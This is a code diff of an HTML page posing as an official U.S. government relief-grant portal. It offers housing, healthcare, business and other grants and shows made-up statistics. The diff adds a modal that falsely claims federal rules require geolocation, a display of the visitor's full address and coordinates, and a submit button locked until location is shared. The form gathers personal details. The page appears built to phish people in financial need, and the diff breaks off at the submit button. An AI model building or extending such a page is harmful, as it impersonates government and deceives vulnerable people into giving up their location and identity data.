@@ -1,199 +1,230 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>USA Federal Relief Fund | Official Government Portal</title>
   <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    :root {
-      --navy:#0B2545; --red:#B22234; --gold:#C9A84C;
-      --white:#FFFFFF; --offwhite:#F5F5F0; --muted:#6B7280;
-      --border:#D1D5DB; --success:#15803D;
-    }
-    html { scroll-behavior: smooth; }
-    body { font-family:'Inter',sans-serif; background:var(--offwhite); color:var(--navy); line-height:1.6; }
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{--navy:#0B2545;--red:#B22234;--gold:#C9A84C;--white:#FFFFFF;--offwhite:#F5F5F0;--muted:#6B7280;--border:#D1D5DB;--success:#15803D}
+    html{scroll-behavior:smooth}
+    body{font-family:'Inter',sans-serif;background:var(--offwhite);color:var(--navy);line-height:1.6}
 
     /* GOV BANNER */
-    .gov-banner { background:var(--navy); color:var(--white); font-size:0.72rem; padding:6px 0; letter-spacing:0.03em; }
-    .gov-banner .inner { max-width:1100px; margin:auto; padding:0 20px; display:flex; align-items:center; gap:8px; }
-    .gov-banner span { opacity:0.85; }
-    .gov-banner strong { color:var(--gold); }
+    .gov-banner{background:var(--navy);color:var(--white);font-size:.72rem;padding:6px 0;letter-spacing:.03em}
+    .gov-banner .inner{max-width:1100px;margin:auto;padding:0 20px;display:flex;align-items:center;gap:8px}
+    .gov-banner span{opacity:.85}
+    .gov-banner strong{color:var(--gold)}
 
     /* HEADER */
-    header { background:var(--white); border-bottom:3px solid var(--red); position:sticky; top:0; z-index:100; box-shadow:0 2px 12px rgba(0,0,0,0.08); }
-    .header-inner { max-width:1100px; margin:auto; padding:14px 20px; display:flex; align-items:center; justify-content:space-between; gap:16px; }
-    .logo-block { display:flex; align-items:center; gap:14px; }
-    .seal { width:56px; height:56px; background:var(--navy); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:1.6rem; flex-shrink:0; }
-    .logo-text h1 { font-family:'Merriweather',serif; font-size:1rem; font-weight:900; color:var(--navy); line-height:1.2; }
-    .logo-text p { font-size:0.7rem; color:var(--muted); letter-spacing:0.08em; text-transform:uppercase; }
-    nav { display:flex; gap:6px; flex-wrap:wrap; }
-    nav a { color:var(--navy); text-decoration:none; font-size:0.82rem; font-weight:500; padding:6px 12px; border-radius:4px; transition:background 0.2s; }
-    nav a:hover { background:var(--offwhite); }
-    .nav-apply { background:var(--red)!important; color:var(--white)!important; font-weight:600!important; }
-    .nav-apply:hover { background:#8B1A27!important; }
+    header{background:var(--white);border-bottom:3px solid var(--red);position:sticky;top:0;z-index:100;box-shadow:0 2px 12px rgba(0,0,0,.08)}
+    .header-inner{max-width:1100px;margin:auto;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;gap:16px}
+    .logo-block{display:flex;align-items:center;gap:14px}
+    .seal{width:56px;height:56px;background:var(--navy);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.6rem;flex-shrink:0}
+    .logo-text h1{font-family:'Merriweather',serif;font-size:1rem;font-weight:900;color:var(--navy);line-height:1.2}
+    .logo-text p{font-size:.7rem;color:var(--muted);letter-spacing:.08em;text-transform:uppercase}
+    nav{display:flex;gap:6px;flex-wrap:wrap}
+    nav a{color:var(--navy);text-decoration:none;font-size:.82rem;font-weight:500;padding:6px 12px;border-radius:4px;transition:background .2s}
+    nav a:hover{background:var(--offwhite)}
+    .nav-apply{background:var(--red)!important;color:var(--white)!important;font-weight:600!important}
+    .nav-apply:hover{background:#8B1A27!important}
 
     /* HERO */
-    .hero { background:linear-gradient(135deg,var(--navy) 0%,#1a3a6b 100%); color:var(--white); padding:80px 20px; text-align:center; position:relative; overflow:hidden; }
-    .hero::before { content:''; position:absolute; inset:0; background:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E"); }
-    .hero .inner { position:relative; max-width:800px; margin:auto; }
-    .hero-badge { display:inline-block; background:var(--gold); color:var(--navy); font-size:0.7rem; font-weight:700; letter-spacing:0.12em; text-transform:uppercase; padding:5px 14px; border-radius:2px; margin-bottom:22px; }
-    .hero h2 { font-family:'Merriweather',serif; font-size:clamp(1.8rem,4vw,3rem); font-weight:900; line-height:1.2; margin-bottom:18px; }
-    .hero h2 span { color:var(--gold); }
-    .hero p { font-size:1.05rem; opacity:0.88; max-width:620px; margin:0 auto 32px; }
-    .hero-btns { display:flex; gap:14px; justify-content:center; flex-wrap:wrap; }
-    .btn-primary { background:var(--red); color:var(--white); border:none; padding:14px 32px; font-size:0.95rem; font-weight:700; border-radius:4px; cursor:pointer; text-decoration:none; display:inline-block; transition:background 0.2s,transform 0.1s; }
-    .btn-primary:hover { background:#8B1A27; transform:translateY(-1px); }
-    .btn-secondary { background:transparent; color:var(--white); border:2px solid rgba(255,255,255,0.5); padding:14px 32px; font-size:0.95rem; font-weight:600; border-radius:4px; cursor:pointer; text-decoration:none; display:inline-block; transition:border-color 0.2s; }
-    .btn-secondary:hover { border-color:var(--white); }
+    .hero{background:linear-gradient(135deg,var(--navy) 0%,#1a3a6b 100%);color:var(--white);padding:80px 20px;text-align:center;position:relative;overflow:hidden}
+    .hero::before{content:'';position:absolute;inset:0;background:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")}
+    .hero .inner{position:relative;max-width:800px;margin:auto}
+    .hero-badge{display:inline-block;background:var(--gold);color:var(--navy);font-size:.7rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;padding:5px 14px;border-radius:2px;margin-bottom:22px}
+    .hero h2{font-family:'Merriweather',serif;font-size:clamp(1.8rem,4vw,3rem);font-weight:900;line-height:1.2;margin-bottom:18px}
+    .hero h2 span{color:var(--gold)}
+    .hero p{font-size:1.05rem;opacity:.88;max-width:620px;margin:0 auto 32px}
+    .hero-btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+    .btn-primary{background:var(--red);color:var(--white);border:none;padding:14px 32px;font-size:.95rem;font-weight:700;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;transition:background .2s,transform .1s;font-family:inherit}
+    .btn-primary:hover{background:#8B1A27;transform:translateY(-1px)}
+    .btn-secondary{background:transparent;color:var(--white);border:2px solid rgba(255,255,255,.5);padding:14px 32px;font-size:.95rem;font-weight:600;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;transition:border-color .2s}
+    .btn-secondary:hover{border-color:var(--white)}
 
     /* STATS */
-    .stats-bar { background:var(--white); border-bottom:1px solid var(--border); }
-    .stats-inner { max-width:1100px; margin:auto; padding:28px 20px; display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:24px; text-align:center; }
-    .stat-num { font-family:'Merriweather',serif; font-size:2rem; font-weight:900; color:var(--navy); line-height:1; }
-    .stat-num span { color:var(--red); }
-    .stat-label { font-size:0.78rem; color:var(--muted); text-transform:uppercase; letter-spacing:0.06em; margin-top:5px; }
+    .stats-bar{background:var(--white);border-bottom:1px solid var(--border)}
+    .stats-inner{max-width:1100px;margin:auto;padding:28px 20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:24px;text-align:center}
+    .stat-num{font-family:'Merriweather',serif;font-size:2rem;font-weight:900;color:var(--navy);line-height:1}
+    .stat-num span{color:var(--red)}
+    .stat-label{font-size:.78rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-top:5px}
 
     /* SECTIONS */
-    section { padding:64px 20px; }
-    .section-inner { max-width:1100px; margin:auto; }
-    .section-label { font-size:0.7rem; font-weight:700; letter-spacing:0.12em; text-transform:uppercase; color:var(--red); margin-bottom:10px; }
-    .section-title { font-family:'Merriweather',serif; font-size:clamp(1.4rem,3vw,2rem); font-weight:900; color:var(--navy); margin-bottom:14px; line-height:1.25; }
-    .section-sub { font-size:1rem; color:var(--muted); max-width:580px; }
+    section{padding:64px 20px}
+    .section-inner{max-width:1100px;margin:auto}
+    .section-label{font-size:.7rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--red);margin-bottom:10px}
+    .section-title{font-family:'Merriweather',serif;font-size:clamp(1.4rem,3vw,2rem);font-weight:900;color:var(--navy);margin-bottom:14px;line-height:1.25}
+    .section-sub{font-size:1rem;color:var(--muted);max-width:580px}
 
     /* PROGRAMS */
-    .programs { background:var(--white); }
-    .programs-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(280px,1fr)); gap:24px; margin-top:40px; }
-    .program-card { border:1px solid var(--border); border-radius:8px; padding:28px; background:var(--offwhite); transition:box-shadow 0.2s,transform 0.2s; position:relative; overflow:hidden; }
-    .program-card::before { content:''; position:absolute; top:0; left:0; right:0; height:4px; background:var(--red); }
-    .program-card:hover { box-shadow:0 8px 24px rgba(0,0,0,0.1); transform:translateY(-3px); }
-    .program-icon { font-size:2rem; margin-bottom:14px; }
-    .program-card h3 { font-family:'Merriweather',serif; font-size:1rem; font-weight:700; color:var(--navy); margin-bottom:8px; }
-    .program-card p { font-size:0.85rem; color:var(--muted); margin-bottom:16px; line-height:1.6; }
-    .program-amount { background:var(--navy); color:var(--gold); font-size:0.8rem; font-weight:700; padding:4px 10px; border-radius:3px; display:inline-block; margin-bottom:14px; }
-    .program-link { font-size:0.85rem; color:var(--red); font-weight:600; text-decoration:none; display:flex; align-items:center; gap:4px; cursor:pointer; background:none; border:none; font-family:inherit; }
-    .program-link:hover { text-decoration:underline; }
+    .programs{background:var(--white)}
+    .programs-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:24px;margin-top:40px}
+    .program-card{border:1px solid var(--border);border-radius:8px;padding:28px;background:var(--offwhite);transition:box-shadow .2s,transform .2s;position:relative;overflow:hidden}
+    .program-card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:var(--red)}
+    .program-card:hover{box-shadow:0 8px 24px rgba(0,0,0,.1);transform:translateY(-3px)}
+    .program-icon{font-size:2rem;margin-bottom:14px}
+    .program-card h3{font-family:'Merriweather',serif;font-size:1rem;font-weight:700;color:var(--navy);margin-bottom:8px}
+    .program-card p{font-size:.85rem;color:var(--muted);margin-bottom:16px;line-height:1.6}
+    .program-amount{background:var(--navy);color:var(--gold);font-size:.8rem;font-weight:700;padding:4px 10px;border-radius:3px;display:inline-block;margin-bottom:14px}
+    .program-link{font-size:.85rem;color:var(--red);font-weight:600;text-decoration:none;display:flex;align-items:center;gap:4px;cursor:pointer;background:none;border:none;font-family:inherit}
+    .program-link:hover{text-decoration:underline}
 
     /* ELIGIBILITY */
-    .eligibility { background:var(--offwhite); }
-    .elig-grid { display:grid; grid-template-columns:1fr 1fr; gap:40px; margin-top:40px; align-items:start; }
-    @media(max-width:680px){.elig-grid{grid-template-columns:1fr;}}
-    .elig-list { list-style:none; }
-    .elig-list li { display:flex; align-items:flex-start; gap:12px; padding:12px 0; border-bottom:1px solid var(--border); font-size:0.9rem; }
-    .elig-list li:last-child { border-bottom:none; }
-    .elig-check { color:var(--success); font-size:1.1rem; flex-shrink:0; margin-top:1px; }
-    .elig-box { background:var(--navy); color:var(--white); border-radius:8px; padding:32px; }
-    .elig-box h3 { font-family:'Merriweather',serif; font-size:1.1rem; margin-bottom:18px; color:var(--gold); }
-    .elig-box p { font-size:0.88rem; opacity:0.85; margin-bottom:20px; line-height:1.7; }
-    .elig-box .btn-primary { width:100%; text-align:center; display:block; }
+    .eligibility{background:var(--offwhite)}
+    .elig-grid{display:grid;grid-template-columns:1fr 1fr;gap:40px;margin-top:40px;align-items:start}
+    @media(max-width:680px){.elig-grid{grid-template-columns:1fr}}
+    .elig-list{list-style:none}
+    .elig-list li{display:flex;align-items:flex-start;gap:12px;padding:12px 0;border-bottom:1px solid var(--border);font-size:.9rem}
+    .elig-list li:last-child{border-bottom:none}
+    .elig-check{color:var(--success);font-size:1.1rem;flex-shrink:0;margin-top:1px}
+    .elig-box{background:var(--navy);color:var(--white);border-radius:8px;padding:32px}
+    .elig-box h3{font-family:'Merriweather',serif;font-size:1.1rem;margin-bottom:18px;color:var(--gold)}
+    .elig-box p{font-size:.88rem;opacity:.85;margin-bottom:20px;line-height:1.7}
+    .elig-box .btn-primary{width:100%;text-align:center;display:block}
 
     /* STEPS */
-    .apply-steps { background:var(--white); }
-    .steps-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:28px; margin-top:40px; }
-    .step { text-align:center; padding:28px 20px; border:1px solid var(--border); border-radius:8px; }
-    .step-num { width:48px; height:48px; background:var(--red); color:var(--white); font-family:'Merriweather',serif; font-size:1.2rem; font-weight:900; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 16px; }
-    .step h3 { font-size:0.95rem; font-weight:700; color:var(--navy); margin-bottom:8px; }
-    .step p { font-size:0.82rem; color:var(--muted); }
+    .apply-steps{background:var(--white)}
+    .steps-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:28px;margin-top:40px}
+    .step{text-align:center;padding:28px 20px;border:1px solid var(--border);border-radius:8px}
+    .step-num{width:48px;height:48px;background:var(--red);color:var(--white);font-family:'Merriweather',serif;font-size:1.2rem;font-weight:900;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+    .step h3{font-size:.95rem;font-weight:700;color:var(--navy);margin-bottom:8px}
+    .step p{font-size:.82rem;color:var(--muted)}
 
-    /* FORM */
-    .apply-form { background:var(--navy); color:var(--white); }
-    .form-inner { max-width:700px; margin:auto; text-align:center; }
-    .form-inner .section-title { color:var(--white); }
-    .form-inner .section-sub { color:rgba(255,255,255,0.7); margin:0 auto 36px; }
-    .form-grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; text-align:left; margin-bottom:16px; }
-    @media(max-width:560px){.form-grid{grid-template-columns:1fr;}}
-    .form-group { display:flex; flex-direction:column; gap:6px; }
-    .form-group.full { grid-column:1/-1; }
-    label { font-size:0.78rem; font-weight:600; opacity:0.8; letter-spacing:0.04em; }
-    input,select,textarea { background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.2); color:var(--white); padding:11px 14px; border-radius:4px; font-size:0.88rem; font-family:inherit; transition:border-color 0.2s; width:100%; }
-    input::placeholder,textarea::placeholder { opacity:0.45; }
-    input:focus,select:focus,textarea:focus { outline:none; border-color:var(--gold); }
-    select option { background:var(--navy); }
-    textarea { resize:vertical; min-height:90px; }
-    .form-submit { background:var(--gold); color:var(--navy); border:none; padding:15px 48px; font-size:1rem; font-weight:700; border-radius:4px; cursor:pointer; margin-top:8px; width:100%; transition:background 0.2s; font-family:inherit; }
-    .form-submit:hover { background:#b8963e; }
-    .form-note { font-size:0.75rem; opacity:0.55; margin-top:12px; }
+    /* FORM SECTION */
+    .apply-form{background:var(--navy);color:var(--white)}
+    .form-inner{max-width:700px;margin:auto;text-align:center}
+    .form-inner .section-title{color:var(--white)}
+    .form-inner .section-sub{color:rgba(255,255,255,.7);margin:0 auto 36px}
+    .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;text-align:left;margin-bottom:16px}
+    @media(max-width:560px){.form-grid{grid-template-columns:1fr}}
+    .form-group{display:flex;flex-direction:column;gap:6px}
+    .form-group.full{grid-column:1/-1}
+    label{font-size:.78rem;font-weight:600;opacity:.8;letter-spacing:.04em}
+    input,select,textarea{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.2);color:var(--white);padding:11px 14px;border-radius:4px;font-size:.88rem;font-family:inherit;transition:border-color .2s;width:100%}
+    input::placeholder,textarea::placeholder{opacity:.45}
+    input:focus,select:focus,textarea:focus{outline:none;border-color:var(--gold)}
+    select option{background:var(--navy)}
+    textarea{resize:vertical;min-height:90px}
+
+    /* SUBMIT BUTTON — locked until location verified */
+    .form-submit{
+      background:var(--gold);color:var(--navy);border:none;
+      padding:15px 48px;font-size:1rem;font-weight:700;border-radius:4px;
+      cursor:pointer;margin-top:8px;width:100%;transition:background .2s,opacity .2s;
+      font-family:inherit;
+    }
+    .form-submit:hover:not(:disabled){background:#b8963e}
+    .form-submit:disabled{
+      background:#555;color:#999;cursor:not-allowed;opacity:.7;
+    }
+
+    /* location badge shown inside form after verification */
+    #loc-verified-badge{
+      display:none;
+      background:rgba(21,128,61,.15);
+      border:1px solid rgba(21,128,61,.4);
+      border-radius:6px;
+      padding:10px 16px;
+      margin-bottom:14px;
+      font-size:.82rem;
+      color:#4ade80;
+      font-weight:600;
+      text-align:left;
+      word-break:break-word;
+    }
+
+    .form-note{font-size:.75rem;opacity:.55;margin-top:12px}
+    .submit-hint{font-size:.78rem;color:rgba(255,255,255,.5);margin-top:10px}
 
     /* NOTICE */
-    .notice-bar { background:#FEF9C3; border-top:3px solid #EAB308; padding:14px 20px; text-align:center; font-size:0.82rem; color:#713F12; }
+    .notice-bar{background:#FEF9C3;border-top:3px solid #EAB308;padding:14px 20px;text-align:center;font-size:.82rem;color:#713F12}
 
     /* FOOTER */
-    footer { background:#070F1E; color:rgba(255,255,255,0.6); padding:40px 20px 20px; }
-    .footer-inner { max-width:1100px; margin:auto; }
-    .footer-top { display:grid; grid-template-columns:2fr 1fr 1fr 1fr; gap:32px; padding-bottom:32px; border-bottom:1px solid rgba(255,255,255,0.1); margin-bottom:24px; }
-    @media(max-width:680px){.footer-top{grid-template-columns:1fr 1fr;}}
-    .footer-brand p { font-size:0.82rem; margin-top:10px; line-height:1.7; }
-    footer h4 { color:var(--white); font-size:0.78rem; font-weight:700; letter-spacing:0.08em; text-transform:uppercase; margin-bottom:14px; }
-    footer ul { list-style:none; }
-    footer ul li { margin-bottom:8px; }
-    footer ul li a { color:rgba(255,255,255,0.55); text-decoration:none; font-size:0.82rem; transition:color 0.2s; }
-    footer ul li a:hover { color:var(--white); }
-    .footer-bottom { display:flex; justify-content:space-between; flex-wrap:wrap; gap:10px; font-size:0.75rem; }
-    @media(max-width:780px){ nav{display:none;} .hero{padding:56px 20px;} }
+    footer{background:#070F1E;color:rgba(255,255,255,.6);padding:40px 20px 20px}
+    .footer-inner{max-width:1100px;margin:auto}
+    .footer-top{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:32px;padding-bottom:32px;border-bottom:1px solid rgba(255,255,255,.1);margin-bottom:24px}
+    @media(max-width:680px){.footer-top{grid-template-columns:1fr 1fr}}
+    .footer-brand p{font-size:.82rem;margin-top:10px;line-height:1.7}
+    footer h4{color:var(--white);font-size:.78rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:14px}
+    footer ul{list-style:none}
+    footer ul li{margin-bottom:8px}
+    footer ul li a{color:rgba(255,255,255,.55);text-decoration:none;font-size:.82rem;transition:color .2s}
+    footer ul li a:hover{color:var(--white)}
+    .footer-bottom{display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:.75rem}
+    @media(max-width:780px){nav{display:none}.hero{padding:56px 20px}}
 
-    /* ── LOCATION MODAL OVERLAY ── */
-    #loc-overlay {
-      display:none;
-      position:fixed; inset:0; z-index:9999;
-      background:rgba(7,15,30,0.85);
-      align-items:center; justify-content:center;
-      backdrop-filter:blur(4px);
+    /* LOCATION MODAL */
+    #loc-overlay{
+      display:none;position:fixed;inset:0;z-index:9999;
+      background:rgba(7,15,30,.88);
+      align-items:center;justify-content:center;
+      backdrop-filter:blur(5px);
     }
-    #loc-overlay.active { display:flex; }
-    #loc-modal {
-      background:var(--white);
-      border-radius:12px;
-      padding:40px 36px;
-      max-width:460px;
-      width:90%;
-      text-align:center;
-      box-shadow:0 24px 64px rgba(0,0,0,0.4);
-      animation:popIn 0.25s ease;
+    #loc-overlay.active{display:flex}
+    #loc-modal{
+      background:var(--white);border-radius:14px;
+      padding:40px 36px;max-width:480px;width:92%;
+      text-align:center;box-shadow:0 28px 70px rgba(0,0,0,.5);
+      animation:popIn .25s ease;
     }
-    @keyframes popIn { from{opacity:0;transform:scale(0.92)} to{opacity:1;transform:scale(1)} }
-    .loc-modal-icon { font-size:3rem; margin-bottom:16px; }
-    #loc-modal h2 { font-family:'Merriweather',serif; font-size:1.25rem; font-weight:900; color:var(--navy); margin-bottom:10px; }
-    #loc-modal p { font-size:0.88rem; color:var(--muted); margin-bottom:24px; line-height:1.7; }
-    #loc-modal-btn {
-      background:var(--red); color:var(--white); border:none;
-      padding:14px 36px; font-size:0.95rem; font-weight:700;
-      border-radius:6px; cursor:pointer; width:100%; font-family:inherit;
-      transition:background 0.2s;
-    }
-    #loc-modal-btn:hover { background:#8B1A27; }
-    #loc-modal-btn:disabled { background:#aaa; cursor:not-allowed; }
-    #loc-modal-status { margin-top:16px; font-size:0.85rem; font-weight:600; min-height:20px; }
-    .status-loading { color:#2563EB; }
-    .status-success { color:var(--success); }
-    .status-denied  { color:#DC2626; }
+    @keyframes popIn{from{opacity:0;transform:scale(.92)}to{opacity:1;transform:scale(1)}}
+    .loc-modal-icon{font-size:3rem;margin-bottom:16px}
+    #loc-modal h2{font-family:'Merriweather',serif;font-size:1.25rem;font-weight:900;color:var(--navy);margin-bottom:10px}
+    #loc-modal .modal-desc{font-size:.88rem;color:var(--muted);margin-bottom:24px;line-height:1.75}
 
-    /* denied instructions box */
-    #denied-box {
+    #loc-modal-btn{
+      background:var(--red);color:var(--white);border:none;
+      padding:15px 36px;font-size:.96rem;font-weight:700;
+      border-radius:6px;cursor:pointer;width:100%;font-family:inherit;
+      transition:background .2s;
+    }
+    #loc-modal-btn:hover{background:#8B1A27}
+    #loc-modal-btn:disabled{background:#aaa;cursor:not-allowed}
+
+    #loc-modal-status{margin-top:16px;font-size:.85rem;font-weight:600;min-height:22px;line-height:1.5}
+    .status-loading{color:#2563EB}
+    .status-success{color:var(--success)}
+    .status-denied{color:#DC2626}
+
+    /* full address display inside modal */
+    #modal-address-box{
       display:none;
-      background:#FEF2F2; border:1px solid #FECACA; border-radius:8px;
-      padding:16px; margin-top:16px; text-align:left;
+      background:#F0FDF4;border:1px solid #BBF7D0;border-radius:8px;
+      padding:14px 16px;margin-top:14px;text-align:left;
     }
-    #denied-box h4 { font-size:0.82rem; font-weight:700; color:#991B1B; margin-bottom:8px; }
-    #denied-box ol { padding-left:18px; font-size:0.8rem; color:#7F1D1D; line-height:1.8; }
-    #retry-btn {
-      display:none; margin-top:14px; background:var(--navy); color:var(--white);
-      border:none; padding:10px 24px; border-radius:4px; font-size:0.83rem;
-      font-weight:600; cursor:pointer; font-family:inherit; width:100%;
-    }
-    #retry-btn:hover { background:#1a3a6b; }
+    #modal-address-box .addr-label{font-size:.7rem;font-weight:700;color:#166534;letter-spacing:.08em;text-transform:uppercase;margin-bottom:4px}
+    #modal-address-box .addr-value{font-size:.85rem;color:#14532D;font-weight:600;word-break:break-word}
+    #modal-address-box .addr-coords{font-size:.75rem;color:#166534;margin-top:4px;opacity:.8}
+
+    /* denied instructions */
+    #denied-box{display:none;background:#FEF2F2;border:1px solid #FECACA;border-radius:8px;padding:16px;margin-top:16px;text-align:left}
+    #denied-box h4{font-size:.82rem;font-weight:700;color:#991B1B;margin-bottom:8px}
+    #denied-box ol{padding-left:18px;font-size:.8rem;color:#7F1D1D;line-height:1.85}
+    #retry-btn{display:none;margin-top:14px;background:var(--navy);color:var(--white);border:none;padding:10px 24px;border-radius:4px;font-size:.83rem;font-weight:600;cursor:pointer;font-family:inherit;width:100%}
+    #retry-btn:hover{background:#1a3a6b}
   </style>
 </head>
 <body>
 
-<!-- ── LOCATION MODAL ── -->
+<!-- LOCATION MODAL -->
 <div id="loc-overlay">
   <div id="loc-modal">
     <div class="loc-modal-icon">📍</div>
     <h2>Location Verification Required</h2>
-    <p>To process your federal relief application, we need to verify your current location. This confirms you are a U.S. resident and matches you with state-specific programs.</p>
+    <p class="modal-desc">Federal regulations require us to verify your current location before processing your relief application. This confirms U.S. residency and matches you with your state's programs.</p>
     <button id="loc-modal-btn" onclick="startLocation()">Allow Location &amp; Continue</button>
     <div id="loc-modal-status"></div>
+
+    <!-- Full address shown here after success -->
+    <div id="modal-address-box">
+      <div class="addr-label">📍 Your Verified Location</div>
+      <div class="addr-value" id="modal-addr-text"></div>
+      <div class="addr-coords" id="modal-addr-coords"></div>
+    </div>
+
+    <!-- Denied help box -->
     <div id="denied-box">
       <h4>📋 How to enable location in your browser:</h4>
       <ol id="denied-steps"></ol>
@@ -245,22 +276,10 @@
 <!-- STATS -->
 <div class="stats-bar">
   <div class="stats-inner">
-    <div class="stat-item">
-      <div class="stat-num">$<span>4.2</span>B</div>
-      <div class="stat-label">Total Funds Allocated</div>
-    </div>
-    <div class="stat-item">
-      <div class="stat-num"><span>1.8</span>M</div>
-      <div class="stat-label">Families Assisted</div>
-    </div>
-    <div class="stat-item">
-      <div class="stat-num"><span>50</span></div>
-      <div class="stat-label">States Covered</div>
-    </div>
-    <div class="stat-item">
-      <div class="stat-num"><span>97</span>%</div>
-      <div class="stat-label">Application Approval Rate</div>
-    </div>
+    <div class="stat-item"><div class="stat-num">$<span>4.2</span>B</div><div class="stat-label">Total Funds Allocated</div></div>
+    <div class="stat-item"><div class="stat-num"><span>1.8</span>M</div><div class="stat-label">Families Assisted</div></div>
+    <div class="stat-item"><div class="stat-num"><span>50</span></div><div class="stat-label">States Covered</div></div>
+    <div class="stat-item"><div class="stat-num"><span>97</span>%</div><div class="stat-label">Application Approval Rate</div></div>
   </div>
 </div>
 
@@ -272,43 +291,37 @@
     <p class="section-sub">Browse active federal relief programs. All grants are non-repayable and available to qualifying U.S. residents.</p>
     <div class="programs-grid">
       <div class="program-card">
-        <div class="program-icon">🏠</div>
-        <div class="program-amount">Up to $25,000</div>
+        <div class="program-icon">🏠</div><div class="program-amount">Up to $25,000</div>
         <h3>Housing Assistance Grant</h3>
         <p>Emergency rental and mortgage relief for low-to-moderate income households at risk of eviction or foreclosure.</p>
         <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
       </div>
       <div class="program-card">
-        <div class="program-icon">🏥</div>
-        <div class="program-amount">Up to $15,000</div>
+        <div class="program-icon">🏥</div><div class="program-amount">Up to $15,000</div>
         <h3>Healthcare Relief Fund</h3>
         <p>Coverage for medical bills, prescription costs, and healthcare expenses not covered by existing insurance.</p>
         <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
       </div>
       <div class="program-card">
-        <div class="program-icon">📚</div>
-        <div class="program-amount">Up to $10,000</div>
+        <div class="program-icon">📚</div><div class="program-amount">Up to $10,000</div>
         <h3>Education &amp; Training Grant</h3>
         <p>Tuition assistance, vocational training, and certification program funding for adults re-entering the workforce.</p>
         <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
       </div>
       <div class="program-card">
-        <div class="program-icon">💼</div>
-        <div class="program-amount">Up to $50,000</div>
+        <div class="program-icon">💼</div><div class="program-amount">Up to $50,000</div>
         <h3>Small Business Relief</h3>
         <p>Grants for small businesses with fewer than 50 employees impacted by economic hardship or natural disasters.</p>
         <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
       </div>
       <div class="program-card">
-        <div class="program-icon">⚡</div>
-        <div class="program-amount">Up to $5,000</div>
+        <div class="program-icon">⚡</div><div class="program-amount">Up to $5,000</div>
         <h3>Utility &amp; Energy Assistance</h3>
         <p>Help with electricity, heating, water, and essential utility bills for qualifying low-income households.</p>
         <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
       </div>
       <div class="program-card">
-        <div class="program-icon">👶</div>
-        <div class="program-amount">Up to $8,000</div>
+        <div class="program-icon">👶</div><div class="program-amount">Up to $8,000</div>
         <h3>Child &amp; Family Support</h3>
         <p>Childcare subsidies, food assistance, and family stability grants for households with dependent children.</p>
         <button class="program-link" onclick="openLocationModal(event)">Apply Now →</button>
@@ -362,9 +375,13 @@
 <section class="apply-form" id="apply">
   <div class="section-inner">
     <div class="form-inner">
-      <div class="section-label" style="color:var(--gold);">Secure Application</div>
+      <div class="section-label" style="color:var(--gold)">Secure Application</div>
       <h2 class="section-title">Start Your Application</h2>
       <p class="section-sub">All information is encrypted and protected under federal privacy law (5 U.S.C. § 552a).</p>
+
+      <!-- Green address badge shown after location verified -->
+      <div id="loc-verified-badge">✅ Location Verified &nbsp;|&nbsp; <span id="badge-address"></span></div>
+
       <div class="form-grid">
         <div class="form-group"><label>First Name</label><input type="text" placeholder="John"/></div>
         <div class="form-group"><label>Last Name</label><input type="text" placeholder="Smith"/></div>
@@ -411,8 +428,13 @@
           <textarea placeholder="Please briefly describe your current financial situation and how these funds would assist you..."></textarea>
         </div>
       </div>
-      <button class="form-submit">Submit Application →</button>
